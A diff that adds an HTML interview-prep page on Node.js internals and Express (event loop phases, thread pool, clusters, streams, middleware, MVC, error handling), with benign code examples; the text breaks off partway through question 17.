@@ -1,0 +1,1773 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Node & Express — MERN Interview Revision</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+
+<header class="site">
+  <div class="inner">
+    <h1><a href="../index.html">MERN Interview Revision</a></h1>
+    <nav class="topics">
+      <a href="js-quirks.html">JS &amp; React Quirks</a>
+      <a href="js-fundamentals.html">JS Fundamentals</a>
+      <a href="html-css.html">HTML &amp; CSS</a>
+      <a href="sql.html">SQL</a>
+      <a href="mongodb.html">MongoDB</a>
+      <a href="operating-systems.html">Operating Systems</a>
+      <a href="computer-networks.html">Computer Networks</a>
+      <a href="kafka.html">Kafka</a>
+      <a href="node-express.html" class="active">Node &amp; Express</a>
+      <a href="nestjs.html">Nest.js</a>
+      <a href="react.html">React</a>
+      <a href="nextjs.html">Next.js</a>
+      <a href="java-spring-boot.html">Java &amp; Spring Boot</a>
+      <a href="java-interview.html">Java Interview</a>
+      <a href="ruby-on-rails.html">Ruby on Rails</a>
+      <a href="cicd.html">CI/CD</a>
+      <a href="scenario-based-1.html">Scenario-Based 1</a>
+      <a href="scenario-based-2.html">Scenario-Based 2</a>
+      <a href="misc.html">Misc</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <h1 class="page-title">Node.js &amp; Backend Engineering — Interview Prep</h1>
+  <p class="page-sub">Node internals, Express, REST, databases, auth, file uploads, system design. Priority noted where marked in the source (*** highest).</p>
+
+  <h2 class="section-heading">1. Node.js Concurrency &amp; Internals</h2>
+
+  <details class="qa">
+    <summary><span class="q-num">Q1.</span> What is Node.js? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Node.js is a JavaScript runtime built on Google's V8 engine that lets JavaScript run outside the browser — on a server, in a CLI tool, anywhere a normal OS process can run. It isn't a language and it isn't a framework; it's an execution environment: V8 actually runs the JS, and libuv plus a set of built-in modules (<code>fs</code>, <code>http</code>, <code>path</code>, <code>crypto</code>, ...) give that JS access to the filesystem, network sockets, and other OS-level capabilities a browser deliberately keeps JS sandboxed away from.</p>
+      <pre><code>Browser JS                         Node.js
+──────────────────────             ──────────────────────
+V8 engine                          V8 engine
++ Web APIs (DOM, fetch, ...)       + libuv (event loop, thread pool)
+sandboxed — no filesystem access   + built-in modules (fs, http, ...)
+                                    full OS access</code></pre>
+      <p>What makes it a good fit for backend/API work specifically is what the next few questions dig into: a single-threaded event loop combined with non-blocking I/O by design (Q2), and an ecosystem — npm — that's the exact same package manager and module system frontend JS already uses, letting a MERN team share language, tooling, and occasionally even code (e.g. a validation schema) between client and server.</p>
+      <p><strong>Common follow-up:</strong> "so is Node.js single-threaded or multi-threaded?" — the JavaScript you write always runs on a single thread, but Node as a whole isn't single-threaded under the hood; libuv maintains its own thread pool for work the OS can't do asynchronously (see Q6). That distinction is exactly what the next question unpacks.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q2.</span> How does Node.js handle concurrency despite being single-threaded? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Node.js is single-threaded — one call stack, one piece of JS executing at a time. It achieves high concurrency through non-blocking I/O and the event loop, powered by libuv.</p>
+      <p>Instead of waiting for I/O (disk, network, DB), Node delegates those tasks to the OS/thread pool and continues executing other code. When I/O finishes, a callback is placed in the event queue and executed once the call stack is free.</p>
+      <pre><code>  ┌──────────────────────────┐
+  │       JavaScript         │   ← Single thread (V8 engine)
+  │      (Call Stack)        │
+  └────────────┬─────────────┘
+               │  delegates I/O
+  ┌────────────▼─────────────┐
+  │         libuv            │   ← Handles async I/O, thread pool
+  │  (Event Loop + OS I/O)   │
+  └────────────┬─────────────┘
+               │ callback when done
+  ┌────────────▼─────────────┐
+  │       Event Queue        │   ← Callbacks waiting to run
+  └──────────────────────────┘</code></pre>
+      <p><strong>Analogy:</strong> a single waiter (Node.js) takes orders and passes them to the kitchen (OS/thread pool), then serves other tables instead of waiting. When food is ready, the kitchen notifies the waiter to deliver it.</p>
+      <p>Under the hood, network I/O doesn't even need the thread pool — libuv registers sockets/file descriptors with the OS's native async notification mechanism (epoll on Linux, kqueue on macOS, IOCP on Windows). The OS itself watches thousands of sockets and tells libuv which ones are ready, which is why Node can hold tens of thousands of open connections cheaply. Only APIs that lack a true async syscall (file system, DNS lookup, some crypto) get offloaded to the libuv thread pool instead.</p>
+      <p><strong>Common follow-up:</strong> "so is Node truly single-threaded?" — no, only your JS runs on one thread; libuv's thread pool and the OS's I/O layer run in parallel underneath. <strong>Common pitfall:</strong> assuming Node is bad for all CPU work — it's fine for I/O-bound APIs but a heavy synchronous loop (image processing, big JSON.parse) will still freeze every other request because it occupies the one JS thread.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q3.</span> Explain the event loop and its 6 phases <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <pre><code>   ┌─────────────────────────────┐
+   │           timers            │  ← setTimeout, setInterval callbacks
+   └──────────────┬──────────────┘
+                  │
+   ┌──────────────▼──────────────┐
+   │      pending callbacks      │  ← I/O errors deferred from prev loop
+   └──────────────┬──────────────┘
+                  │
+   ┌──────────────▼──────────────┐
+   │       idle, prepare         │  ← Internal use only (libuv)
+   └──────────────┬──────────────┘
+                  │
+   ┌──────────────▼──────────────┐
+   │            poll             │  ← Fetch new I/O events; execute I/O callbacks
+   └──────────────┬──────────────┘
+                  │
+   ┌──────────────▼──────────────┐
+   │            check            │  ← setImmediate() callbacks
+   └──────────────┬──────────────┘
+                  │
+   ┌──────────────▼──────────────┐
+   │       close callbacks       │  ← e.g., socket.on('close', ...)
+   └─────────────────────────────┘
+         ↑ loops back to top</code></pre>
+      <table>
+        <tr><th>Phase</th><th>What runs here</th></tr>
+        <tr><td>Timers</td><td>setTimeout/setInterval callbacks whose delay has elapsed</td></tr>
+        <tr><td>Pending Callbacks</td><td>I/O callbacks deferred from previous loop iteration (e.g., TCP errors)</td></tr>
+        <tr><td>Idle/Prepare</td><td>Internal use only — libuv housekeeping</td></tr>
+        <tr><td>Poll</td><td>Retrieves new I/O events; executes I/O-related callbacks (most land here)</td></tr>
+        <tr><td>Check</td><td>setImmediate() callbacks execute here</td></tr>
+        <tr><td>Close Callbacks</td><td>Cleanup callbacks like socket.on('close')</td></tr>
+      </table>
+      <p>Between each phase, Node drains the microtask queue (Promises + process.nextTick).</p>
+      <p>The <strong>poll</strong> phase is the workhorse: it calculates how long to block waiting for I/O events (or returns immediately if there's already work queued), then executes callbacks for completed I/O. If there are <code>setImmediate</code> callbacks scheduled and the poll queue is empty, the loop won't idle in poll — it jumps straight to <strong>check</strong>. This is exactly why <code>setImmediate</code> inside an I/O callback always fires before a <code>setTimeout(fn, 0)</code> scheduled at the same point — you've just come from poll, so check runs next, before timers gets a chance in the following iteration.</p>
+      <p><strong>Interviewers often follow up with:</strong> "what happens if a timer callback throws, or an I/O callback schedules more I/O?" — each phase fully drains its own queue (with a cap on new callbacks added during processing) and microtasks run after every single callback, not just at the end of a phase. A common pitfall is treating the event loop as one single FIFO queue — it's actually several queues serviced in a fixed phase order, plus a higher-priority microtask/nextTick layer that gets first refusal after every callback.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q4.</span> Microtasks vs macrotasks <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>Microtasks</th><th>Macrotasks</th></tr>
+        <tr><td>Examples</td><td>Promise.then, async/await, process.nextTick</td><td>setTimeout, setInterval, setImmediate, I/O callbacks</td></tr>
+        <tr><td>Queue</td><td>Microtask queue</td><td>Macrotask queue (event loop phases)</td></tr>
+        <tr><td>Priority</td><td>Higher — runs before next phase</td><td>Lower — runs in its designated phase</td></tr>
+        <tr><td>Execution</td><td>After every task, before next phase</td><td>Once per event loop phase</td></tr>
+      </table>
+      <p><strong>Order:</strong> process.nextTick → Promise.then → setImmediate / setTimeout</p>
+      <pre><code>setTimeout(() => console.log('setTimeout'), 0);
+Promise.resolve().then(() => console.log('Promise'));
+process.nextTick(() => console.log('nextTick'));
+
+// Output:
+// nextTick
+// Promise
+// setTimeout</code></pre>
+      <p>process.nextTick fires before Promises because it has its own dedicated "nextTick queue" drained before the microtask queue.</p>
+      <p>Crucially, microtasks aren't just drained "once per loop" — the entire nextTick + microtask queue is emptied <em>after every single callback</em>, even in the middle of a phase, before Node moves on to the next callback or phase. This means a chain of <code>.then()</code> calls that keeps scheduling more <code>.then()</code>s can, in principle, starve the event loop and delay I/O callbacks and timers indefinitely — a real production footgun known as microtask/nextTick starvation.</p>
+      <p><strong>Common pitfall:</strong> recursively calling <code>process.nextTick</code> inside itself (e.g., in older stream implementations) can block I/O entirely, since Node won't proceed to the next phase until the nextTick queue is empty. Interviewers like to ask you to trace the exact output order of a mixed nextTick/Promise/setTimeout/setImmediate snippet — practice this until it's automatic.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q5.</span> Difference between a process and a thread <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>Process</th><th>Thread</th></tr>
+        <tr><td>Definition</td><td>Independent program with its own memory space</td><td>A unit of execution within a process, sharing its memory</td></tr>
+        <tr><td>Memory</td><td>Isolated — own heap, stack, data</td><td>Shared — threads share the process's memory</td></tr>
+        <tr><td>Communication</td><td>IPC (pipes, sockets, shared memory)</td><td>Directly via shared variables</td></tr>
+        <tr><td>Overhead</td><td>High — expensive to create</td><td>Low — lightweight</td></tr>
+        <tr><td>Crash isolation</td><td>A crash doesn't affect other processes</td><td>A crash can crash the whole process</td></tr>
+        <tr><td>Node.js example</td><td>child_process.fork() — new Node process</td><td>worker_threads — threads within the process</td></tr>
+      </table>
+      <p>The isolated memory of a process is why crashing one cluster worker doesn't take down the others — the OS enforces separate address spaces, so a segfault or unhandled exception in worker A simply can't corrupt worker B's heap. Threads trade that safety for speed: because they share memory directly, communication is just a variable read/write with no serialization cost, but that also means a bug in one thread (a bad pointer, a data race) can corrupt shared state for the whole process.</p>
+      <p><strong>Follow-up interviewers ask:</strong> "why does Node use processes (cluster) for scaling instead of just spinning up more threads?" — because JS objects aren't safely shareable across threads without explicit serialization (structured clone via <code>postMessage</code>, or <code>SharedArrayBuffer</code> for raw bytes); processes sidestep that entirely by giving each one its own V8 instance and event loop.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q6.</span> What is the Libuv thread pool? What tasks use it? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>libuv is the C library that powers Node's async I/O. It provides the event loop and a thread pool (default 4 threads, configurable via UV_THREADPOOL_SIZE).</p>
+      <p>The thread pool handles tasks that cannot be done asynchronously at the OS level (or are delegated for performance):</p>
+      <table>
+        <tr><th>Uses Thread Pool</th><th>Does NOT use Thread Pool</th></tr>
+        <tr><td>fs (file system reads/writes)</td><td>TCP/UDP networking (OS async)</td></tr>
+        <tr><td>crypto (hashing, encryption)</td><td>HTTP requests</td></tr>
+        <tr><td>dns.lookup()</td><td>Pipes, signals</td></tr>
+        <tr><td>zlib (compression)</td><td>dns.resolve() (OS async)</td></tr>
+      </table>
+      <pre><code>// Uses the thread pool — doesn't block the event loop
+const crypto = require('crypto');
+crypto.pbkdf2('password', 'salt', 100000, 64, 'sha512', (err, key) => {
+  console.log('Done hashing');
+});
+console.log('This runs BEFORE hashing is done');</code></pre>
+      <p>If you fire 5 crypto.pbkdf2 calls simultaneously and pool size is 4, the 5th waits for a free thread.</p>
+      <p>Increasing <code>UV_THREADPOOL_SIZE</code> (up to 1024) can help throughput for fs/crypto-heavy workloads, but it must be set as an environment variable before Node starts — setting it in code after libuv has already initialized the pool has no effect. Note that on Linux, modern libuv versions can use native async file I/O (io_uring) for some fs operations, bypassing the thread pool, but this is version/platform dependent — don't assume it in interviews unless asked specifically.</p>
+      <p><strong>Common pitfall:</strong> forgetting that DNS has two paths — <code>dns.lookup()</code> goes through the thread pool (and competes with fs/crypto for those same 4 threads), while <code>dns.resolve()</code> variants use c-ares and talk to the DNS server directly via the event loop, without touching the thread pool. A busy fs-heavy app can starve DNS lookups if it's using <code>dns.lookup()</code>.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q7.</span> How does a Node server handle 1000 requests at once? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Via non-blocking I/O and the event loop — no new thread per request (unlike Apache/PHP).</p>
+      <pre><code>1000 requests arrive
+      │
+      ▼
+Event Loop picks up each request callback
+      │
+      ▼
+For each request — if it needs I/O (DB query, file read):
+  → Node registers the I/O operation with libuv
+  → Immediately moves on to the next request
+      │
+      ▼
+OS / thread pool performs the I/O asynchronously
+      │
+      ▼
+When I/O completes → callback is placed in event queue
+      │
+      ▼
+Event loop picks up the callback → sends response</code></pre>
+      <p>Most web requests are I/O-bound. Node doesn't waste a thread waiting — it processes other requests while waiting.</p>
+      <pre><code>Traditional server:    1000 requests → 1000 threads → high RAM, context switching
+Node.js:               1000 requests → 1 thread + async I/O → low RAM, efficient</code></pre>
+      <p>Concretely: each request's synchronous handler code (parsing params, building a query, sending the response) runs to completion in the JS thread before yielding — but the actual waiting (DB round-trip, disk read) happens off-thread via libuv/OS, so the JS thread is only ever busy for microseconds per request rather than milliseconds. This is why Node scales well for I/O-bound APIs with modest CPU per request but degrades badly the moment handlers do real computation (JSON transforms on huge payloads, synchronous crypto, image resizing) — that work monopolizes the single thread and every other one of the 1000 requests queues up behind it.</p>
+      <p><strong>Interviewer follow-up:</strong> "what's the actual limit then?" — not thread count, but throughput of the single event loop tick plus whatever ceiling the DB/downstream service imposes; that's why horizontal scaling (cluster/PM2, multiple instances behind a load balancer) is the standard answer once one process saturates a core.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q8.</span> What is a blocking operation and why is it dangerous? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>A blocking operation halts the event loop until it completes — no other code can run during that time.</p>
+      <pre><code>// BLOCKING — stops everything
+const fs = require('fs');
+const data = fs.readFileSync('./large-file.txt'); // blocks event loop
+
+// BLOCKING — CPU intensive loop
+for (let i = 0; i < 1e10; i++) { /* ... */ }
+
+// NON-BLOCKING — event loop continues
+fs.readFile('./large-file.txt', (err, data) => {
+  console.log(data);
+});</code></pre>
+      <pre><code>Request 1 → triggers fs.readFileSync (blocks for 500ms)
+    ↓
+Request 2 → WAITS (even though it just needs "hello world")
+Request 3 → WAITS
+...
+Request 1000 → WAITS</code></pre>
+      <p>All 999 other users experience delay because of one blocking call. In a multi-threaded server, other threads handle other requests; in Node there's only one thread.</p>
+      <p>Blocking isn't limited to obvious sync file APIs — it also includes CPU-heavy synchronous work hidden inside a request path: large regex backtracking (ReDoS), synchronous JSON.stringify/parse on huge objects, tight loops for data transformation, or bcrypt's sync variant. All of these hold the single thread hostage exactly like <code>fs.readFileSync</code> does.</p>
+      <p><strong>Detecting it in production:</strong> event loop lag/delay metrics (e.g., via <code>perf_hooks.monitorEventLoopDelay()</code> or APM tools) spike during blocking operations — this is usually how teams first notice the problem, since request latency alone doesn't point at the cause. <strong>Common pitfall:</strong> using <code>JSON.parse</code> on a very large request body synchronously in a hot route — it looks harmless but can stall the loop for hundreds of milliseconds under load.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q9.</span> What are clusters in Node.js and when do we use them? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>By default a Node process runs on one CPU core. Clusters spawn multiple worker processes that share the same server port, utilizing all available CPU cores.</p>
+      <p><strong>Process vs cluster:</strong> A <strong>process</strong> is a single running instance of your application, while a <strong>cluster</strong> is a collection of multiple processes (workers) orchestrated by a primary process to share the workload across all available CPU cores.</p>
+      <pre><code>const cluster = require('cluster');
+const os = require('os');
+const http = require('http');
+
+if (cluster.isPrimary) {
+  const numCPUs = os.cpus().length;
+  console.log(`Primary ${process.pid} is running`);
+
+  for (let i = 0; i < numCPUs; i++) {
+    cluster.fork();
+  }
+
+  cluster.on('exit', (worker) => {
+    console.log(`Worker ${worker.process.pid} died`);
+    cluster.fork();
+  });
+} else {
+  http.createServer((req, res) => {
+    res.end('Hello from worker ' + process.pid);
+  }).listen(3000);
+}</code></pre>
+      <p><strong>When to use:</strong> CPU-intensive apps, utilizing multi-core machines, zero-downtime restarts.</p>
+      <p>In production, use PM2 (<code>pm2 start app.js -i max</code>) which manages clustering automatically.</p>
+      <p>Each worker is a completely separate Node process with its own event loop, memory, and V8 heap — the primary process doesn't run application code, it just forks workers and, on Linux, uses round-robin scheduling by default to distribute incoming connections across them (on Windows the OS itself does the load balancing). Because workers don't share memory, any in-process state (in-memory cache, rate-limit counters, WebSocket connection maps) is per-worker only — a request handled by worker 2 has no visibility into worker 1's state, which is a very common gotcha when moving from a single process to a cluster.</p>
+      <p><strong>Common pitfall:</strong> assuming clustering fixes memory leaks or blocking code — it only adds more single threads in parallel; a leak still grows per-worker, and a blocking call still stalls whichever worker got that request. <strong>Interview follow-up:</strong> "how do you share state across workers?" — externalize it to Redis or the database rather than relying on in-memory objects.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q10.</span> Worker Threads vs the event loop model <span class="priority">*</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>Event Loop</th><th>Worker Threads</th></tr>
+        <tr><td>Best for</td><td>I/O-bound tasks (DB, network, file)</td><td>CPU-bound tasks (heavy computation)</td></tr>
+        <tr><td>Memory</td><td>Shared process</td><td>Separate memory (message passing)</td></tr>
+        <tr><td>Overhead</td><td>Very low</td><td>Medium (thread creation)</td></tr>
+        <tr><td>Examples</td><td>REST API handling, DB queries</td><td>Image resizing, video encoding, ML, encryption</td></tr>
+      </table>
+      <pre><code>const { Worker, isMainThread, parentPort } = require('worker_threads');
+
+if (isMainThread) {
+  const worker = new Worker(__filename);
+  worker.on('message', (result) => console.log('Result:', result));
+  worker.postMessage({ data: [1, 2, 3, 4, 5] });
+} else {
+  parentPort.on('message', ({ data }) => {
+    const result = data.reduce((a, b) => a + b, 0);
+    parentPort.postMessage(result);
+  });
+}</code></pre>
+      <p>Unlike <code>cluster</code>/<code>child_process.fork()</code> (separate processes, separate V8 instances), worker threads run inside the same process and can share raw memory via <code>SharedArrayBuffer</code> — cheaper than IPC serialization when passing large binary buffers back and forth. Regular JS objects passed via <code>postMessage</code> are still structured-cloned (copied), not shared, so there's real overhead for large object graphs, just less than a full process fork.</p>
+      <p><strong>Common pitfall:</strong> reaching for worker_threads for I/O work — since I/O is already non-blocking via libuv, adding threads there just adds complexity for no gain. They're worth the overhead only for genuinely CPU-bound work (image/video processing, large synchronous data transforms, cryptographic key generation) that would otherwise block the main event loop.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q11.</span> Streams — types and when to use them <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Streams let you read/write data piece by piece (chunks) instead of loading everything into memory at once. Ideal for large files, video, real-time data.</p>
+      <table>
+        <tr><th>Type</th><th>Direction</th><th>Example</th></tr>
+        <tr><td>Readable</td><td>Read only</td><td>fs.createReadStream(), HTTP request</td></tr>
+        <tr><td>Writable</td><td>Write only</td><td>fs.createWriteStream(), HTTP response</td></tr>
+        <tr><td>Duplex</td><td>Read + Write</td><td>TCP socket, net.Socket</td></tr>
+        <tr><td>Transform</td><td>Read + Write + modify</td><td>zlib.createGzip(), encryption</td></tr>
+      </table>
+      <pre><code>// BAD — loads entire file into memory
+const data = fs.readFileSync('./bigfile.mp4');
+res.end(data);
+
+// GOOD — streams chunks, minimal memory usage
+const readStream = fs.createReadStream('./bigfile.mp4');
+readStream.pipe(res);
+
+// Transform stream — compress on the fly
+const { createReadStream, createWriteStream } = require('fs');
+const { createGzip } = require('zlib');
+
+createReadStream('input.txt')
+  .pipe(createGzip())
+  .pipe(createWriteStream('output.txt.gz'));</code></pre>
+      <p>Streams operate on a fixed-size internal buffer (the <code>highWaterMark</code>) rather than loading the whole payload — when a writable destination is slower than the readable source, <code>.pipe()</code> automatically applies <strong>backpressure</strong>: it pauses the readable side once the writable's buffer fills, and resumes it once the writable emits <code>'drain'</code>. Handling this manually (without <code>.pipe()</code>) is a classic Node bug source — writing without checking the return value of <code>write()</code> can balloon memory usage exactly the way streams were meant to prevent.</p>
+      <p><strong>Interview follow-up:</strong> "why not just use <code>.pipe()</code> everywhere?" — for multiple destinations, error handling, or conditional branching, many production codebases now prefer the promise-based <code>stream.pipeline()</code> (or <code>stream/promises</code>) since it automatically forwards errors and cleans up streams that would otherwise leak file descriptors if you chained raw <code>.pipe()</code> calls yourself.</p>
+    </div>
+  </details>
+
+  <h2 class="section-heading">2. Express.js &amp; MVC Architecture</h2>
+
+  <details class="qa">
+    <summary><span class="q-num">Q12.</span> What is Express.js? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Express is a minimal, unopinionated web framework for Node.js. It sits on top of Node's built-in <code>http</code> module and provides the pieces almost every server needs but Node doesn't hand you out of the box: declarative routing, a middleware pipeline, and a far thinner request/response API than writing directly against <code>http.createServer</code> requires.</p>
+      <pre><code>// raw Node http — parse the URL/method and route by hand
+const http = require('http');
+http.createServer((req, res) => {
+  if (req.method === 'GET' &amp;&amp; req.url === '/users') {
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify([]));
+  }
+}).listen(3000);
+
+// Express — routing and response helpers built in
+const express = require('express');
+const app = express();
+app.get('/users', (req, res) => {
+  res.json([]);
+});
+app.listen(3000);</code></pre>
+      <p>Express isn't part of Node itself — it's a separate npm package (<code>npm install express</code>) that's become the de facto standard for building REST APIs in Node precisely because it's unopinionated: it doesn't prescribe a folder structure, an ORM, or a validation library, it just supplies routing and middleware and gets out of the way. That's why layering something like MVC on top of it (Q15) is a convention a team adopts, not something Express itself enforces.</p>
+      <p><strong>Common follow-up:</strong> "how does this differ from Nest.js?" — Nest.js is an opinionated framework that typically runs <em>on top of</em> Express (or Fastify) itself, adding architecture, dependency injection, and decorators Express deliberately leaves out — see the <a href="nestjs.html">Nest.js</a> page for that comparison in depth.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q13.</span> Express middleware and the middleware chain <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Middleware is a function with access to req, res, and next. It can execute code, modify req/res, end the request-response cycle, or call next() to pass control on.</p>
+      <pre><code>function myMiddleware(req, res, next) {
+  console.log('Before route handler');
+  next();
+}</code></pre>
+      <pre><code>Request
+  │
+  ▼
+Middleware 1 (logger)
+  │ next()
+  ▼
+Middleware 2 (auth check)
+  │ next()
+  ▼
+Middleware 3 (JSON parser)
+  │ next()
+  ▼
+Route Handler → Response</code></pre>
+      <pre><code>const express = require('express');
+const app = express();
+
+app.use(express.json());           // parse JSON body
+app.use(morgan('dev'));            // logging
+app.use(authMiddleware);           // authentication
+
+app.get('/admin', requireAdmin, (req, res) => {
+  res.json({ message: 'Admin dashboard' });
+});
+
+// Error middleware — must have 4 params
+app.use((err, req, res, next) => {
+  res.status(500).json({ error: err.message });
+});</code></pre>
+      <p>Order matters — middleware executes in the order it's defined.</p>
+      <p>Under the hood, Express builds a linked list of handler functions per request; each middleware only advances to the next one when it explicitly calls <code>next()</code> — forgetting to call it (or call <code>res.end()</code>) leaves the request hanging forever with no response and no error, which is a very common bug for beginners. Middleware can also be scoped: app-level (<code>app.use</code>), router-level (<code>express.Router()</code>), and route-level (passed as extra arguments to <code>app.get(path, mw1, mw2, handler)</code>), all composing into the same chain.</p>
+      <p><strong>Interview follow-up:</strong> "how does Express know an error-handling middleware apart from a regular one?" — purely by arity: a 4-argument function <code>(err, req, res, next)</code> is treated as an error handler and is only invoked when a previous middleware calls <code>next(err)</code> or throws (in an Express-5-aware context) — this is why the error handler must be defined with exactly 4 parameters even if you don't use all of them.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q14.</span> app.use() vs app.get() <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>app.use()</th><th>app.get()</th></tr>
+        <tr><td>HTTP methods</td><td>All methods</td><td>Only GET</td></tr>
+        <tr><td>Path matching</td><td>Prefix match — /api matches /api, /api/users, /api/users/1</td><td>Exact match — /users only matches /users</td></tr>
+        <tr><td>Typical use</td><td>Middleware, sub-routers</td><td>Route handlers</td></tr>
+      </table>
+      <pre><code>app.use('/api', router);        // Matches /api, /api/users, /api/anything
+app.get('/users', handler);     // Only matches GET /users exactly
+
+app.use(express.json());        // applies everywhere</code></pre>
+      <p>A subtlety worth knowing: <code>app.get()</code> is really just <code>app.use()</code> with a method + exact-path filter applied internally — Express's router matches methods and paths using the same underlying layer mechanism (historically path-to-regexp) for both. That's why you can mount a router with <code>app.use('/api', router)</code> and then define exact-match routes inside that router with <code>router.get('/users', ...)</code> — the prefix strips off before the inner router evaluates the remaining path.</p>
+      <p><strong>Common pitfall:</strong> registering <code>app.use(express.json())</code> after your routes — middleware registered later never runs for requests already matched by an earlier route, so the body parser must come before any route that needs <code>req.body</code>.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q15.</span> Designing an Express backend with MVC <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>MVC = Model → View → Controller (in APIs, View is replaced by the JSON response).</p>
+      <pre><code>src/
+├── routes/
+│   └── user.routes.js       ← defines endpoints, maps to controllers
+├── controllers/
+│   └── user.controller.js   ← handles req/res, calls services
+├── services/
+│   └── user.service.js      ← business logic
+├── models/
+│   └── user.model.js        ← Mongoose/Sequelize schema
+├── middleware/
+│   ├── auth.middleware.js
+│   └── error.middleware.js
+├── config/
+│   └── db.js                ← DB connection
+└── app.js                   ← Express setup</code></pre>
+      <pre><code>Request → Router → Controller → Service → Model → DB
+                                              ↓
+Response ←─────── Controller ←── Service ←───┘</code></pre>
+      <pre><code>// routes/user.routes.js
+const router = express.Router();
+router.post('/register', UserController.register);
+router.get('/:id', authMiddleware, UserController.getUser);
+
+// controllers/user.controller.js
+class UserController {
+  static async register(req, res, next) {
+    try {
+      const user = await UserService.createUser(req.body);
+      res.status(201).json({ success: true, data: user });
+    } catch (err) {
+      next(err);
+    }
+  }
+}
+
+// services/user.service.js
+class UserService {
+  static async createUser(data) {
+    const hashedPassword = await bcrypt.hash(data.password, 10);
+    return await User.create({ ...data, password: hashedPassword });
+  }
+}
+
+// models/user.model.js
+const userSchema = new mongoose.Schema({
+  name: { type: String, required: true },
+  email: { type: String, unique: true },
+  password: String
+});</code></pre>
+      <p>The service layer is the piece teams most often skip, but it's what keeps controllers thin and testable — controllers should only translate HTTP in and out (parse req, call a service, shape the response); all business rules (validation beyond schema, calling multiple models, orchestrating a transaction) belong in services so they can be unit-tested without spinning up Express at all. Models should stay "dumb" wrappers around persistence — validation belongs at the schema level, but decisions like "can this user cancel this order" belong in services, not models.</p>
+      <p><strong>Interview follow-up:</strong> "what goes wrong if you skip the service layer?" — controllers accumulate business logic, become impossible to unit test without mocking req/res, and logic gets duplicated across controllers that need the same operation (e.g., both a REST controller and a queue worker needing to "create a user").</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q16.</span> Best practice for error handling in Express <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Centralized error middleware — a single place to handle all errors consistently.</p>
+      <pre><code>const errorHandler = (err, req, res, next) => {
+  const statusCode = err.statusCode || 500;
+  const message = err.message || 'Internal Server Error';
+
+  console.error(err.stack);
+
+  res.status(statusCode).json({
+    success: false,
+    error: {
+      message,
+      ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
+    }
+  });
+};
+
+class AppError extends Error {
+  constructor(message, statusCode) {
+    super(message);
+    this.statusCode = statusCode;
+    this.isOperational = true;
+  }
+}
+
+throw new AppError('User not found', 404);
+
+// app.js — MUST be last middleware
+app.use(errorHandler);</code></pre>
+      <p><strong>Best practices:</strong> always use next(err) in async routes (or asyncHandler); distinguish operational errors from programming errors; never send stack traces in production; log errors with a logger.</p>
+      <p>The "operational vs programmer error" distinction matters more than it looks: operational errors (bad user input, failed DB connection, expired token) are expected and should return a clean 4xx/5xx JSON response and keep the process running. Programmer errors (undefined is not a function, a typo) indicate the process is in an unknown state — many teams intentionally let the process crash on these (via a top-level <code>uncaughtException</code>/<code>unhandledRejection</code> handler that logs and exits) and rely on a process manager (PM2, Kubernetes) to restart cleanly, rather than trying to keep running in a corrupted state.</p>
+      <p><strong>Common pitfall:</strong> putting the error-handling middleware anywhere except last — Express matches middleware in registration order, so an error handler defined before your routes will never see their errors.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q17.</span> next(err) vs throwing errors in async Express routes <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <h3>The synchronous way — how Express 4 expects code to run</h3>
+      <p>When a route handler is synchronous, Express wraps the call in a hidden safety net and catches whatever it throws.</p>
+      <pre><code>// Express handles this fine
+app.get('/route', (req, res) => {
+  throw new Error('Oops!'); // Express catches this immediately
+});</code></pre>
+      <ol>
+        <li>A request comes in.</li>
+        <li>Express runs the handler function.</li>
+        <li>The function throws and crashes immediately, synchronously.</li>
+        <li>Express catches the crash right there and sends a <code>500 Internal Server Error</code> to the client.</li>
+      </ol>
+
+      <h3>The asynchronous way — where Express 4 breaks</h3>
+      <p>Adding <code>async</code> to a route handler changes what that function actually hands back to Express, and that's the whole problem.</p>
+      <pre><code>// Express fails here
+app.get('/route', async (req, res) => {
+  const data = await fetchFromDatabase(); // takes 2 seconds
+  throw new Error('Database failed!');
+});</code></pre>
+      <ol>
+        <li>A request comes in.</li>
